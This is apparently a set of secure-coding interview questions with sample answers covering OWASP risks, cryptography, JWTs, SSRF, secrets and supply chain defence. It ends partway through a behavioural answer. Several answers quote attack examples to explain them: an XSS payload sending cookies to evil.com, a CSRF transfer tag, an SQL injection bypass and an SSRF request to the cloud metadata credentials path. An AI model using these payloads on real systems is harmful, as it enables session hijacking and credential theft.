# Cybersecurity & Secure Coding — Elite Software Engineer Interview Questions

---

## SECTION 1: Foundational Secure Coding Principles

---

**Q1. What is the principle of least privilege, and how do you apply it concretely in code you write day-to-day?**

**Sample Answer:**
The principle of least privilege means every component — a process, user, thread, or service — should have access to only the resources it needs to do its job, and nothing more. In practice this manifests at multiple layers.

At the OS/infrastructure layer, I run services as dedicated non-root users with tightly scoped filesystem permissions. A web server process has read access to its static assets but no write access anywhere on disk outside a specific temp directory.

At the database layer, I create per-service database users with only the SQL operations they need. A read-heavy reporting service gets a user with `SELECT` only. A service that processes orders gets `INSERT` and `UPDATE` on specific tables — never `DROP`, never `CREATE`, never cross-schema access.

At the application layer, when a user uploads a file, the file-handling module gets a pre-signed S3 URL scoped to that single object for a 60-second window — not long-lived credentials to the whole bucket.

At the IAM layer in cloud environments, I follow role-based policies with condition keys. An EC2 instance role that needs to read from one Secrets Manager secret gets a policy scoped to that exact ARN, not `secretsmanager:*` on `*`.

The subtlety I've learned over the years is that least privilege isn't a one-time decision — it's a living concern. Permissions tend to accumulate via "just for now" changes that never get reverted. I build permission audits into our deployment pipelines so that any role or policy change is a conscious code review decision, not a silent ops change.

---

**Q2. Explain defense in depth. Give a concrete architectural example.**

**Sample Answer:**
Defense in depth is the philosophy that security should be layered such that a failure in any single layer does not result in a total system compromise. It's the opposite of perimeter-only security, which assumes everything inside the firewall is safe.

A concrete example: imagine a financial transaction API. A purely perimeter-based design puts a firewall at the edge and trusts everything inside. Defense in depth looks like this instead:

- **Layer 1 — Network perimeter:** WAF + DDoS protection (AWS Shield / Cloudflare). Rate limiting at the IP and user level.
- **Layer 2 — Transport:** TLS 1.3 only, with HSTS headers and certificate pinning on the mobile client.
- **Layer 3 — Authentication:** Short-lived JWTs (15-minute expiry), refresh token rotation, MFA enforced on sensitive operations.
- **Layer 4 — Authorization:** Every API handler re-validates that the authenticated user is authorized for the specific resource — not just "are you logged in" but "does *this* user own *this* account."
- **Layer 5 — Input validation:** Strict schema validation on every incoming payload. Reject anything that doesn't conform before it touches business logic.
- **Layer 6 — Application:** Parameterized queries everywhere. No dynamic SQL. Output encoding before rendering.
- **Layer 7 — Data at rest:** AES-256 encryption for PII, separate encryption keys per customer.
- **Layer 8 — Audit and detection:** Immutable audit logs shipped to a separate account the application cannot write to — only append. Anomaly detection on transaction patterns.
- **Layer 9 — Blast radius containment:** Microservices with no internal implicit trust. Service-to-service auth via mTLS. A compromised checkout service cannot call the user-settings service without explicit authorization.

The point is: an attacker who gets through the WAF still hits auth. One who bypasses auth still hits per-object authorization. Defense in depth turns a potential full compromise into a much harder, multi-stage attack.

---

**Q3. What is the OWASP Top 10? Walk me through at least five of the items and how you prevent them in code.**

**Sample Answer:**
The OWASP Top 10 is a consensus list of the most critical web application security risks, updated periodically. Let me walk through five:

**1. Injection (SQL, LDAP, OS Command)**
The root cause is mixing untrusted data with commands or queries. Prevention: never use string concatenation to build queries. Always use parameterized queries or prepared statements.

Bad:
```python
cursor.execute(f"SELECT * FROM users WHERE email = '{email}'")
```
Good:
```python
cursor.execute("SELECT * FROM users WHERE email = %s", (email,))
```
For OS commands, avoid `shell=True` in Python subprocess calls. Use argument arrays. Better yet, don't invoke shell commands from web code at all — find a library.

**2. Broken Authentication**
Weak session management, credential stuffing, poor password storage. Prevention: use `bcrypt`/`argon2` for passwords — never MD5, SHA1, or even SHA-256 without a proper salt and cost factor. Implement account lockout. Rotate session tokens on privilege escalation (login, sudo operations). Store session tokens in `HttpOnly`, `Secure`, `SameSite=Strict` cookies.

**3. Sensitive Data Exposure (now called Cryptographic Failures)**
Transmitting or storing sensitive data without appropriate encryption. Prevention: enforce TLS everywhere — including internal service-to-service traffic. Never log PII. Mask card numbers in logs (`4111 **** **** 1111`). Use envelope encryption for data at rest — application-level encryption for sensitive fields, not just disk encryption.

**4. Broken Access Control**
Users accessing resources or actions they shouldn't. This is the #1 item in recent OWASP rankings for good reason. Prevention: make authorization a first-class concern at the framework level, not an afterthought per-handler. Implement ABAC or RBAC centrally. Add automated tests that prove unauthorized users get 403s — not just that authorized users get 200s.

```python
# Every resource fetch checks ownership
def get_invoice(user_id, invoice_id):
    invoice = db.get(invoice_id)
    if invoice.owner_id != user_id:
        raise PermissionDenied()
    return invoice
```

**5. Security Misconfiguration**
Default credentials, verbose error messages in production, unnecessary features enabled, S3 buckets left public. Prevention: infrastructure-as-code where security settings are codified and reviewed. Run tools like `tfsec` or `checkov` on Terraform. Strip stack traces from production error responses — return a correlation ID instead. Disable directory listing on web servers. Run `docker scan` on container images. Automate misconfiguration detection in CI.

---

**Q4. What's the difference between authentication and authorization, and what are common pitfalls in each?**

**Sample Answer:**
Authentication is proving identity — "who are you?" Authorization is enforcing what that identity is allowed to do — "are you permitted to do this?"

Common authentication pitfalls:
- **Weak credential storage.** Using MD5 or unsalted SHA for passwords. Use `argon2id` as the modern gold standard.
- **Missing brute force protection.** No rate limiting or CAPTCHA on login endpoints. Attackers can try millions of credential combinations.
- **Predictable session tokens.** Generating session IDs with `rand()` or a timestamp. Use a cryptographically secure random number generator.
- **Not invalidating sessions on logout.** The session token should be server-side revocable, not just deleted from the client cookie jar.
- **JWT `alg: none` attack.** Not validating the `alg` header on JWTs. An attacker can set `"alg": "none"` and forge tokens. Always explicitly specify and enforce the expected algorithm.

Common authorization pitfalls:
- **Confused deputy.** A service with elevated permissions does something on behalf of a lower-privilege caller without re-checking whether the caller is authorized for the underlying operation.
- **IDOR (Insecure Direct Object Reference).** Using sequential integer IDs and not verifying ownership. Changing `/invoices/1001` to `/invoices/1002` reveals another user's invoice. Prevention: use non-sequential IDs (UUIDs) AND enforce ownership checks.
- **Checking authorization at the UI layer only.** The backend never checks because "the button is hidden." Always enforce on the server — never trust the client.
- **Privilege escalation via role assignment.** A user with `manager` role can promote themselves or others to `admin` because the role-assignment endpoint doesn't check that you can only assign roles ≤ your own level.

---

## SECTION 2: Input Validation & Output Encoding

---

**Q5. What is the difference between input validation and output encoding? Why do you need both?**

**Sample Answer:**
They address different attack surfaces and often get conflated, which is dangerous.

**Input validation** is about rejecting or sanitizing data at ingestion time before it enters your system. The goal is to ensure data conforms to what you expect — the right type, length, format, and range. For example: a phone number field should only accept digits, dashes, and plus signs up to 20 characters. Anything else is rejected with a 400 error before it even touches business logic.

**Output encoding** is about ensuring that when you render data to a consumer — whether a browser, a shell, an XML parser, or a SQL engine — the data is treated as *data* and not as executable instructions. For example: a user's display name containing `<script>alert(1)</script>` might have passed input validation (it's valid UTF-8 text). But when you render it in HTML, you must HTML-encode it to `&lt;script&gt;alert(1)&lt;/script&gt;` so the browser doesn't execute it.

**Why you need both:**
- Input validation alone doesn't protect against XSS if you later render unencoded data.
- Output encoding alone is a last-resort safeguard, not a replacement for validating that `user_age = "'; DROP TABLE users; --"` never makes it into your database layer.
- They're complementary. Input validation reduces the attack surface and enforces business rules. Output encoding provides a safety net for data that legitimately contains special characters (like someone whose name is `O'Brien` — that apostrophe is valid input but must be handled correctly in SQL and HTML contexts).

The context of the output matters enormously. HTML encoding is different from JavaScript encoding, URL encoding, CSS encoding, and SQL encoding. Libraries like OWASP's Java Encoder or DOMPurify on the frontend handle context-specific encoding. Never write your own.

---

**Q6. Describe a stored XSS attack end-to-end and how you would prevent it at every layer.**

**Sample Answer:**
**The attack:**
1. An attacker submits a comment on a blog: `Great post! <script>fetch('https://evil.com/steal?c='+document.cookie)</script>`
2. The application stores this raw string in the database.
3. Any user who views that blog post has the malicious script tag rendered in their browser.
4. The script executes, exfiltrating the victim's session cookie to the attacker's server.
5. The attacker uses that cookie to hijack the session.

**Prevention at every layer:**

*Layer 1 — Input validation:* Reject or strip HTML tags from fields that don't expect them. A comment body might legitimately accept some markdown but not raw HTML. Use an allowlist approach with a library like `bleach` (Python) or `sanitize-html` (Node.js) — never a blocklist.

*Layer 2 — Storage:* Store the raw (but validated) input. Don't rely on sanitization at storage time — you may need the original for different rendering contexts.

*Layer 3 — Output encoding:* When rendering the comment in HTML, use context-aware encoding. In a templating engine like Jinja2 or React JSX, auto-escaping handles this. The danger is explicitly bypassing it (`dangerouslySetInnerHTML` in React, `{{ content | safe }}` in Jinja) — those require explicit security review.

*Layer 4 — Content Security Policy (CSP):* Set a strict CSP header: `Content-Security-Policy: default-src 'self'; script-src 'self'`. This tells the browser to refuse to execute any inline scripts or scripts from external origins. Even if XSS payload gets rendered, the browser won't execute it.

*Layer 5 — Cookie flags:* `HttpOnly` cookies cannot be read by JavaScript, so even a successful XSS execution can't steal session cookies via `document.cookie`. This doesn't prevent all XSS damage but greatly limits the impact.

*Layer 6 — Subresource Integrity:* For any third-party scripts, use SRI hashes so a compromised CDN can't inject malicious scripts.

---

## SECTION 3: Cryptography

---

**Q7. What are the differences between hashing, encryption, and encoding? When do you use each?**

**Sample Answer:**

**Encoding** transforms data into a different format for *compatibility*, not security. Base64, URL encoding, hex encoding — these are completely reversible with no secret. If anyone tells you they're "encrypting" data by base64-encoding it, that's a red flag. Use encoding for data transport formatting only.

**Hashing** is a one-way transformation. Given input, you produce a fixed-size digest. It's not reversible (barring preimage attacks on weak algorithms). Use it when you need to verify data without storing the original — passwords, integrity checks, digital signatures. Critical nuance: for passwords, use a *slow*, salted hash (`argon2id`, `bcrypt`, `scrypt`) because fast hashes like SHA-256 allow billions of guesses per second on GPUs.

**Encryption** is a two-way transformation requiring a secret key. Use it when you need to retrieve the original data later. Two flavors:
- *Symmetric:* Same key encrypts and decrypts (AES-256-GCM). Fast. Use for data at rest, bulk data encryption.
- *Asymmetric:* Public key encrypts, private key decrypts (RSA, ECC). Slower. Use for key exchange, digital signatures, TLS handshake.

Common mistake: using encryption for passwords. You don't need to decrypt passwords — you only ever need to verify them. So hash them. If you're encrypting passwords, you have a key management problem and a bigger attack surface.

Another common mistake: using AES-ECB mode. ECB encrypts identical blocks identically, so patterns in the plaintext leak through. Always use AES-GCM (authenticated encryption) or AES-CBC with a random IV and HMAC.

---

**Q8. Explain how TLS works at a high level, and what would you look for in a TLS misconfiguration audit?**

**Sample Answer:**
TLS establishes an encrypted, authenticated channel between two parties. At a high level:

1. **ClientHello:** The client sends supported TLS versions, cipher suites, and a random nonce.
2. **ServerHello:** The server selects the best mutually supported cipher suite and TLS version, and sends its certificate.
3. **Certificate validation:** The client validates the server's certificate against trusted CAs, checking the chain of trust, expiry, and that the hostname matches.
4. **Key exchange:** In TLS 1.3, this is done via ECDHE — both sides contribute to a shared secret without ever transmitting it. This provides forward secrecy.
5. **Session keys derived:** Both sides derive symmetric session keys from the shared secret.
6. **Finished:** Both sides confirm the handshake was untampered with.
7. **Application data:** Encrypted with AES-GCM (or ChaCha20-Poly1305), authenticated with AEAD.

**What I'd look for in a misconfiguration audit:**
- **TLS version:** Reject TLS 1.0 and 1.1 — they have known vulnerabilities (BEAST, POODLE). Enforce TLS 1.2 minimum, prefer TLS 1.3.
- **Weak cipher suites:** Remove RC4, 3DES, export-grade ciphers (FREAK, LOGJAM). Only allow ECDHE for key exchange (forward secrecy) and AES-GCM or ChaCha20 for encryption.
- **Certificate:** Check expiry, key length (RSA ≥ 2048 bits, ECC ≥ 256 bits), signature algorithm (SHA-256 minimum — not MD5 or SHA-1).
- **HSTS:** `Strict-Transport-Security` header with `max-age` ≥ 1 year and `includeSubDomains`. Prevents protocol downgrade attacks.
- **HSTS preload:** Submit to browsers' preload lists so they never connect via HTTP at all.
- **Certificate Transparency:** Ensure CT logs are being written to, enabling detection of rogue cert issuance.
- **OCSP Stapling:** Server should staple the revocation response to avoid client latency.
- **Tools:** I'd run `testssl.sh`, `sslyze`, or Qualys SSL Labs and target an A+ rating.

---

**Q9. What is the difference between symmetric and asymmetric encryption? When would you use each, and what are the gotchas?**

**Sample Answer:**
**Symmetric encryption** uses the same key to encrypt and decrypt. Examples: AES, ChaCha20. It's fast — suitable for encrypting large volumes of data. The problem is key distribution: how do you securely share the key with the other party? If you're the only party (encrypting data at rest for yourself), that's easy. If two parties need to communicate, you have a chicken-and-egg problem.

**Asymmetric encryption** uses a key pair: a public key (shareable with anyone) and a private key (kept secret). What the public key encrypts, only the private key can decrypt — and vice versa. Examples: RSA, ECC (elliptic curve). It solves the key distribution problem. But it's orders of magnitude slower than symmetric encryption and is only suitable for small payloads.

In practice, modern systems use both via **hybrid encryption:**
1. Use asymmetric encryption to securely exchange a symmetric session key.
2. Use that symmetric key to encrypt all actual data.

This is exactly what TLS does — ECDHE to establish a shared secret, then AES-GCM for the session.

**Gotchas:**
- **RSA without padding:** Never use raw RSA. Always use OAEP padding for encryption or PSS for signatures. PKCS#1 v1.5 padding is vulnerable to Bleichenbacher's attack.
- **Key size:** RSA-1024 is broken. Use RSA-2048 minimum, or prefer ECC (equivalent security with smaller keys — EC-256 ≈ RSA-3072).
- **Nonce reuse in AES-GCM:** Reusing a nonce with the same key completely destroys confidentiality and authentication. Use random 96-bit nonces and track that they're never reused.
- **Authenticated encryption:** Don't use AES-CBC without also adding an HMAC (Encrypt-then-MAC). AES-GCM bundles authentication. Without authentication, ciphertext can be modified without detection (padding oracle attacks).

---

## SECTION 4: Web Application Security

---

**Q10. Explain CSRF — how it works, and how you prevent it.**

**Sample Answer:**
**The attack:**
CSRF (Cross-Site Request Forgery) exploits the fact that browsers automatically attach cookies to requests, regardless of which site initiates the request.

Scenario: A user is logged into `bank.com`. Their session cookie is stored in the browser. They visit `evil.com`, which contains:

```html
<img src="https://bank.com/transfer?to=attacker&amount=10000">
```

The browser fetches that URL, automatically attaching the user's `bank.com` session cookie. The bank sees an authenticated request and executes the transfer — even though the user never intended it.

**Prevention:**

1. **CSRF tokens (Synchronizer Token Pattern):** Generate a cryptographically random, per-session (or per-form) token. Embed it as a hidden form field or request header. Validate it server-side on every state-changing request. `evil.com` can trigger the request but cannot read the CSRF token (due to same-origin policy), so it can't include it.

2. **SameSite cookie attribute:** `SameSite=Strict` or `SameSite=Lax` on session cookies. `Strict` means the cookie is never sent in cross-site requests. `Lax` allows it on top-level navigations (clicking a link) but not on embedded requests like `<img>` or `<form>` POSTs. This is now the best first-line defense and is default in modern browsers.

3. **Double submit cookie pattern:** If you can't do server-side state, set a random value in both a cookie and a request header. The server validates they match. Cross-origin requests can't read or set the cookie from another origin.

4. **Custom request headers:** APIs that require a custom header like `X-Requested-With: XMLHttpRequest` get CSRF protection for free, because browsers enforce that custom headers require a CORS preflight — which the server can deny for cross-origin origins.

5. **Check the `Origin` and `Referer` headers:** Not a standalone defense, but a useful secondary check. Reject requests where these headers indicate a different origin.

---

**Q11. What is SQL injection, and how do you prevent it beyond just "use parameterized queries"?**

**Sample Answer:**
SQL injection occurs when attacker-controlled input is interpreted as SQL syntax rather than data. Classic example:

```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'
```

The `--` comments out the password check. The attacker logs in as admin with no password.

**Prevention — in depth:**

**1. Parameterized queries / prepared statements** — This is the primary defense. The query structure is compiled separately from the data. The database never interprets the data as SQL syntax.

**2. ORM usage with caution** — ORMs like SQLAlchemy or Hibernate use parameterized queries internally. But raw query escape hatches (`session.execute(raw_sql)`, `Model.objects.raw()`) bypass this. Treat every raw query call as a code smell requiring security review.

**3. Stored procedures** — When correctly written (not using dynamic SQL inside the procedure), stored procedures add a layer of indirection.

**4. Input validation as a secondary layer** — An integer ID field should never accept `'; DROP TABLE`. Validate types, lengths, and formats. This reduces the attack surface even before queries are formed.

**5. Least privilege on database users** — Even if injection succeeds, a DB user that can only `SELECT` on specific tables can't `DROP TABLE` or exfiltrate data from other schemas. Contain the blast radius.

**6. Error handling** — Never expose raw database error messages to users. They reveal table names, column names, and query structure, which dramatically aid attackers. Log them server-side; return generic errors to clients.

**7. WAF as a supplementary control** — Not a substitute for parameterized queries. But a WAF can detect and block common SQL injection patterns as an additional layer.

**8. Static analysis / SAST tools** — Tools like Semgrep, SonarQube, or Checkmarx can detect string concatenation in SQL contexts at CI time, before code ships.

**9. Regular penetration testing and SQLMap scanning** in non-production environments to catch regressions.

---

**Q12. What is SSRF, and why has it become so dangerous in cloud environments?**

**Sample Answer:**
SSRF (Server-Side Request Forgery) is an attack where an attacker causes the server to make HTTP requests to an unintended destination — typically an internal resource the attacker cannot directly reach.

**Basic example:**
An image resizing service accepts a URL: `POST /resize?url=https://example.com/photo.jpg`

An attacker submits: `POST /resize?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`

On AWS, `169.254.169.254` is the Instance Metadata Service (IMDS). The server fetches it, gets back IAM credentials, and the attacker reads the response — gaining full AWS API access with whatever permissions the EC2 role has.

**Why it's so dangerous in cloud environments:**
- Cloud IMDS endpoints (`169.254.169.254` on AWS, `metadata.google.internal` on GCP) are accessible from any EC2/GCE instance.
- They return IAM credentials that often have very broad permissions because engineers follow "just add more policies" habits.
- Internal services (databases, Kubernetes API server, internal admin panels) are reachable from within the VPC but not from the internet — SSRF bridges that gap.
- Microservices that trust each other internally can be chained: SSRF hits Service A, which calls Service B with higher privilege.

**Prevention:**
1. **Allowlist URLs** — If your service needs to fetch external URLs, maintain a strict allowlist of allowed domains. Reject anything not on the list.
2. **Block private IP ranges** — Before making any outbound request, resolve the hostname and check the resulting IP against a blocklist of RFC 1918 addresses, loopback, and cloud metadata ranges.
3. **IMDSv2 on AWS** — Requires a PUT request with a session token before fetching metadata. This session token cannot be obtained via SSRF in most attack scenarios.
4. **Network-level egress controls** — Use security groups and NACLs to prevent application servers from initiating connections to internal subnets or metadata services.
5. **DNS rebinding protection** — Resolve the hostname, check the IP, *and* re-validate after resolution, since DNS can change between check and use.
6. **Avoid user-supplied URLs in server-side fetches** — If possible, redesign the feature to not require the server to fetch user-specified URLs.

---

## SECTION 5: Authentication & Session Management

---

**Q13. Walk me through the security properties of a well-designed JWT implementation.**

**Sample Answer:**
JWTs (JSON Web Tokens) are popular but routinely misimplemented. A well-designed implementation addresses:

**1. Algorithm enforcement:**
The header contains an `alg` field. Attackers have exploited implementations that accept any algorithm the token claims. Two attacks:
- `alg: none` — Strips the signature entirely. The server must *never* accept `none`.
- Algorithm confusion — If a server uses an RSA public key for HS256 (HMAC), the public key (which is public knowledge) becomes the HMAC secret. Always hardcode the expected algorithm server-side; never trust the token's `alg` header.

**2. Short expiry + refresh tokens:**
Access tokens should be short-lived (5–15 minutes). Long-lived tokens are a liability — they can't be effectively revoked. Pair them with longer-lived refresh tokens stored securely and rotatable on use.

**3. Signature verification:**
Verify the signature on every request. Never skip verification based on any heuristic.

**4. Claims validation:**
- `exp` — Token expiry. Reject expired tokens.
- `nbf` — Not before. Reject tokens used too early.
- `iss` — Issuer. Validate it matches your expected issuer.
- `aud` — Audience. Validate the token was issued for your service, not a different one. This prevents token substitution attacks across microservices.

**5. Storage on the client:**
- `localStorage` is vulnerable to XSS — any injected script can steal the token.
- `HttpOnly` cookies are not accessible to JavaScript. Preferred for session tokens.
- If using `Authorization: Bearer` headers, the token must be stored somewhere JavaScript can read, making XSS protection more critical.

**6. Revocation:**
JWTs are stateless by design, which means they can't be truly revoked before expiry. Mitigations: keep access tokens short-lived, maintain a token revocation list (checked on each request) for sensitive operations like logout or password change, or use opaque tokens backed by server-side sessions for high-security contexts.

**7. Payload sensitivity:**
JWT payloads are base64-encoded, not encrypted. Don't put sensitive data (PII, internal IDs) in a JWT unless you're using JWE (JSON Web Encryption).

---

**Q14. How do you securely implement password reset functionality? What are the attack vectors?**

**Sample Answer:**
Password reset is one of the most commonly exploited features in web applications. Here's how to do it right:

**The correct flow:**
1. User submits their email address.
2. If the email exists, generate a cryptographically random, single-use token (32+ bytes, from a CSPRNG). Store a *hash* of this token in the database along with an expiry (15–60 minutes).
3. Send a link containing the raw token to the user's email.
4. When the user clicks the link, look up the *hash* of the submitted token. Validate it exists and hasn't expired.
5. Allow password reset. Immediately invalidate the token (delete or mark used). Invalidate all existing sessions.

**Attack vectors and mitigations:**

**Predictable tokens:** Using `md5(email + timestamp)` or sequential IDs as tokens. Mitigate with CSPRNG — `secrets.token_urlsafe(32)` in Python.

**Token enumeration:** Returning different responses for "email not found" vs "email found." An attacker can enumerate which emails are registered. Return the same generic message regardless — "If this email is registered, you'll receive a reset link."

**Token stored in plaintext:** If the database is breached, all reset tokens are valid. Store only the SHA-256 hash of the token; send the raw token to the user.

**Long-lived tokens:** A token valid for 24+ hours gives attackers a wide window if they intercept email. Use 15–60 minute expiry.

**Token reuse:** After a reset is completed, the token must be invalidated immediately. Also invalidate if the user logs in normally (reset no longer needed).

**User enumeration via timing attacks:** Even if you return the same message, looking up the user takes more time when found vs not found. Use a constant-time comparison and consider adding a small random delay.

**Session fixation after reset:** After a successful reset, invalidate all existing sessions and issue a new one. Otherwise an attacker who previously hijacked a session retains access.

**Insecure delivery channel:** Sending reset links via SMS is vulnerable to SIM swapping. Email is preferred, ideally with a note about expected sender.

---

## SECTION 6: Secrets Management & Secure Configuration

---

**Q15. How do you manage secrets in a cloud-native application? What are the anti-patterns?**

**Sample Answer:**
**Anti-patterns (what I've seen and fixed):**

- **Secrets in source code.** The most common mistake. Even in private repos — employees leave, repos get forked, GitHub search is powerful. Use tools like `git-secrets`, `truffleHog`, or `gitleaks` in pre-commit hooks and CI to detect committed credentials.
- **Secrets in environment variable files committed to git** (`.env` files). `.gitignore` the `.env` file; commit a `.env.example` with placeholder values only.
- **Secrets in Docker images.** A `RUN` command that copies a secret into the image bakes it into the image layer history, even if a later `RUN rm` removes it.
- **Secrets in CI/CD logs.** Printing environment variables in CI runs. Mask secrets in CI configuration.
- **Long-lived static credentials.** Rotating credentials should be the norm, not the exception.

**What good looks like:**

**For applications running on AWS:**
Use IAM roles for EC2/ECS/Lambda. Never put AWS credentials in application config — the instance metadata service provides temporary credentials automatically. For application-level secrets (database passwords, API keys), use AWS Secrets Manager or Parameter Store with SecureString. Fetch at startup or request time, not baked into the image.

**For multi-cloud or Kubernetes environments:**
HashiCorp Vault with dynamic secrets. Instead of static database passwords, Vault generates a time-limited database user on-demand, hands it to the application, and revokes it after TTL. The application never holds a long-lived credential.

**Kubernetes-specific:**
Don't use Kubernetes Secrets unencrypted (they're just base64-encoded by default). Enable envelope encryption for etcd. Better yet, use an external secrets operator to sync from Vault or AWS Secrets Manager, so the secret never lives in etcd at all.

**Secret rotation:**
Design applications to hot-reload secrets without downtime. Instantiate database connection pools that can be recycled on credential rotation. Test rotation in staging regularly — rotate-and-test is a discipline, not a fire drill.

---

## SECTION 7: Secure Design & Architecture

---

**Q16. What is threat modeling? Walk me through a threat modeling exercise for a file upload feature.**

**Sample Answer:**
Threat modeling is the structured process of identifying what can go wrong in a system, who might want to cause harm, what they'd attack, and what you can do to prevent or mitigate it. I use the STRIDE framework (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege).

**Feature:** Users can upload profile pictures, which are stored and served back.

**Assets to protect:**
- The server's filesystem / storage service
- Other users' files
- The application server itself
- The database

**STRIDE analysis:**

**Spoofing identity** — Can an attacker upload as another user? Mitigate: authenticate and authorize every upload request. Scope the uploaded filename/path to the authenticated user's ID.

**Tampering** — Can the upload corrupt other users' files or overwrite system files? Path traversal attack: if the filename `../../etc/passwd` is used naively in a file path. Mitigate: never use user-supplied filenames in server paths. Generate a UUID-based filename server-side. Store user-provided filenames only as metadata in the database.

**Repudiation** — Can a user deny uploading malicious content? Mitigate: log all uploads with user ID, timestamp, file hash, and IP address. Make logs tamper-evident.

**Information disclosure** — Can uploads leak other users' files? Can uploaded files expose server paths or config? Mitigate: serve files through a controlled endpoint that enforces ownership checks, not directly from an S3 URL with a predictable structure.

**Denial of service** — Can an attacker upload 10GB files and exhaust storage or bandwidth? Mitigate: enforce file size limits (at the load balancer, not just in app code). Rate-limit uploads per user. Use an upload quota.

**Elevation of privilege** — Can a user upload a malicious file that, when processed or executed, grants them higher access? This is the big one:
- **Polyglot files:** A file that is simultaneously a valid JPEG and a valid PHP script. If the server executes files from the upload directory, the attacker gets RCE.
- Mitigate: never serve uploaded files from a directory that has execute permissions. Store uploads in a separate bucket/volume with no execution capability. Validate file type by inspecting magic bytes (not just extension or MIME type from the request). Re-encode images through a pipeline (strip EXIF data, re-render through an image library) which destroys embedded payloads. Scan with antivirus (ClamAV) for known malware.

---

**Q17. What is the concept of "secure by default" and how do you build it into a framework or platform team's output?**

**Sample Answer:**
Secure by default means the safest behavior is what you get without any configuration. Developers using your platform shouldn't have to opt *in* to security — they should have to explicitly opt *out*, which creates a visible, reviewable decision point.

**Practical examples of building it in:**

**HTTP framework:** The default response should include security headers automatically — `Content-Security-Policy`, `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, `Referrer-Policy`, `Permissions-Policy`. Developers who need to override (for embedding in an iframe, for instance) must do so explicitly.

**Database library:** The default query interface should only expose parameterized query methods. Raw string queries should require importing a separate `unsafe` or `raw` module, creating a searchable, grepable footprint that code review can flag.

**Logging library:** The default logger should automatically redact common PII patterns — email addresses, credit card numbers, SSNs, JWTs. Teams that need to log such data must explicitly disable redaction and document why.

**Service-to-service communication:** The default should be mTLS. A service that opts out needs a documented exception.

**IaC modules:** Internal Terraform modules for S3 buckets default to `block_public_acls = true`, `block_public_policy = true`, and encryption enabled. Making a bucket public requires overriding these and that override gets flagged in PR automation.

**Testing:** Build security property tests into the base test suite. A base integration test class can automatically run tests against common misconfiguration — does the service return a 401 for unauthenticated requests? Does the admin endpoint return 403 for non-admin users? Developers get these tests for free.

The broader philosophy: make the pit of success the default path. A developer who just wants to ship a feature should end up with a secure implementation without needing to be a security expert. Security expertise comes in to shape the defaults, not to audit every feature individually.

---

## SECTION 8: DevSecOps & Secure SDLC

---

**Q18. How do you integrate security into a CI/CD pipeline without creating bottlenecks?**

**Sample Answer:**
The tension is real — thorough security scanning can add minutes or hours to a pipeline that teams want to run in minutes. The answer is to be strategic about what runs where and when.

**Fast, synchronous gates (run on every commit, must pass to merge):**
- **Secret scanning:** `truffleHog` or `gitleaks` — runs in seconds. Hard block if a secret is found.
- **Dependency vulnerability scan:** `npm audit`, `pip-audit`, `Dependabot`, `Snyk` — scans the dependency manifest, not the code. Fast. Flag high/critical CVEs as blocking.
- **SAST (static analysis):** Semgrep with a curated ruleset. Use a tight, high-signal ruleset (not 5,000 rules with 80% false positives). Under a minute, high-confidence findings only. False-positive-heavy tools get turned off by frustrated engineers.
- **IaC scanning:** `tfsec`, `checkov` on Terraform/CloudFormation. Runs in seconds.
- **Container image scanning:** `Trivy` or `Grype` on the built image. Blocks on critical CVEs.

**Async, non-blocking (run in parallel or nightly):**
- **Full SAST:** Deeper analysis with more rules. Results feed into a security backlog, not a hard gate.
- **DAST (dynamic analysis):** OWASP ZAP or Burp Suite in automated mode against a staging environment. Run post-deployment to staging.
- **Dependency license compliance:** Legal concern, not urgent enough to block deploys.
- **Software Composition Analysis:** Deep dependency tree analysis.

**Key principles:**
- **Fix the signal, not the noise.** If a tool produces too many false positives, engineers learn to ignore all findings. Tune aggressively for signal quality.
- **"Break-glass" overrides exist** with required justification logged. A security finding shouldn't permanently block a critical production fix at 2 AM. The override should be reviewable after the fact.
- **Shift left culture:** Run SAST locally via IDE plugins (Semgrep VS Code extension, SonarLint). Catching issues before push is faster than catching them in CI.
- **Security debt is tracked** in the same backlog as technical debt. Not every finding needs to be fixed immediately, but it needs to be acknowledged and scheduled.

---

**Q19. What is a supply chain attack, and how do you defend against it in your software dependencies?**

**Sample Answer:**
A supply chain attack compromises software not directly but through a dependency — a library, build tool, or CI/CD component that you trust and include in your software. The SolarWinds attack and the `event-stream` npm package compromise are canonical examples.

**Attack vectors:**

**Typosquatting:** Publishing `reqests` (note the typo) to PyPI hoping developers mistype `requests`. Mitigate: use `pip-audit`, pin exact versions, review new dependencies carefully.

**Dependency confusion:** Publishing a package with the same name as a private internal package to a public registry. Package managers might prefer the public one. Mitigate: configure package registries to prioritize internal feeds. Use namespace scoping for internal packages.

**Account takeover:** An attacker compromises a maintainer's npm/PyPI account and publishes a malicious version of a legitimate, popular package. `event-stream` was compromised this way. Mitigate: pin exact dependency versions with lockfiles (`package-lock.json`, `poetry.lock`, `Pipfile.lock`). Any dependency update is a deliberate action, not silent.

**Build system compromise:** Malicious code injected into a CI runner, build tool, or artifact repository. Mitigate: use ephemeral CI environments, verify artifact checksums, use reproducible builds.

**Typosquatted or malicious transitive dependencies:** You didn't add the malicious package — one of your dependencies did. Mitigate: full dependency tree scanning with `Snyk` or `Dependabot`.

**Defenses:**

1. **Lockfiles, always.** Commit them. Never allow floating version ranges in production code (`^1.2.3` means "give me any future version that might be malicious").
2. **Dependency pinning + hash verification.** Some package managers (pip with `--require-hashes`) can enforce that the downloaded package matches a known hash.
3. **Software Bill of Materials (SBOM).** Generate an SBOM (SPDX or CycloneDX format) for every release. Know exactly what's in your software.
4. **Minimal dependency policy.** Every new dependency should require justification. Can this be done with 50 lines of code instead of adding a new package?
5. **Sigstore / code signing.** Verify that packages are signed by their expected maintainers.
6. **Vendor/bundle critical dependencies.** For extremely critical libraries, fork and audit them yourself. Pin to your fork.
7. **Monitor for dependency updates with automated PRs** (Dependabot, Renovate) so updates are visible, reviewed, and tested — not silent.

---

## SECTION 9: Advanced & Behavioral

---

**Q20. Tell me about a security vulnerability you introduced, discovered, or fixed in production. What happened and what did you learn?**

*(This is a behavioral question — sample answer represents the depth and honesty we want to see)*

**Sample Answer:**
Early in my career I built an internal admin tool that used user-supplied query parameters to filter database results. I used an ORM, so I thought I was safe. What I didn't realize was that I was passing user input directly into the ORM's `order_by()` clause to allow column sorting — and the ORM executed that without parameterization.

A penetration tester found it in a quarterly security review. They were able to use the `order_by` to trigger time-based blind SQL injection and exfiltrate data very slowly. No data was actually stolen — it was found in testing — but the potential for exposure was real.

What I learned:
